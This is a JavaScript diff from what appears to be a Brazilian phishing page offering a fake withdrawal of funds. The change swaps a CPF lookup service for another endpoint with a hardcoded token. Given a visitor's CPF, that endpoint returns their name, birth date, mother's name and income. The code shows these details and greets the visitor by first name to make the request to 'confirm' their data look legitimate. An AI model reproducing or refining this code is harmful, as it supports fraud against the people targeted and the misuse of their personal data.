@@ -148,17 +148,21 @@ if(valor) document.getElementById('valorExibido').textContent = 'R$ ' + valor;
 
 // Busca API se faltar dados
 if(cpf && (!nome || !nasc)){
-  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf=' + cpf)
+  var cleanCpf = cpf.replace(/\D/g, '');
+  fetch('https://searchapi.dnnl.live/consulta?token_api=2077&cpf=' + cleanCpf)
     .then(function(r){ return r.json(); })
     .then(function(d){
-      if(d.nome && !nome){
-        document.getElementById('dadoNome').textContent = d.nome.toUpperCase();
-        document.getElementById('titulo').textContent = 'Atenção, ' + primeiroNome(d.nome) + '! Para darmos continuidade à sua solicitação de saque, confirme seus dados abaixo.';
-        nome = d.nome;
+      if(d.status === 200 && d.dados && d.dados[0]){
+        var item = d.dados[0];
+        if(item.NOME && !nome){
+          document.getElementById('dadoNome').textContent = item.NOME.toUpperCase();
+          document.getElementById('titulo').textContent = 'Atenção, ' + primeiroNome(item.NOME) + '! Para darmos continuidade à sua solicitação de saque, confirme seus dados abaixo.';
+          nome = item.NOME;
+        }
+        if(item.NASC && !nasc){ document.getElementById('dadoNasc').textContent = item.NASC; nasc = item.NASC; }
+        if(item.NOME_MAE && !mae){ mae = item.NOME_MAE; }
+        if(item.RENDA && !valor){ valor = item.RENDA; document.getElementById('valorExibido').textContent = 'R$ ' + item.RENDA; }
       }
-      if(d.nascimento && !nasc){ document.getElementById('dadoNasc').textContent = d.nascimento; nasc = d.nascimento; }
-      if(d.nome_mae && !mae){ mae = d.nome_mae; }
-      if(d.valor && !valor){ valor = d.valor; document.getElementById('valorExibido').textContent = 'R$ ' + d.valor; }
     }).catch(function(){});
 }
 
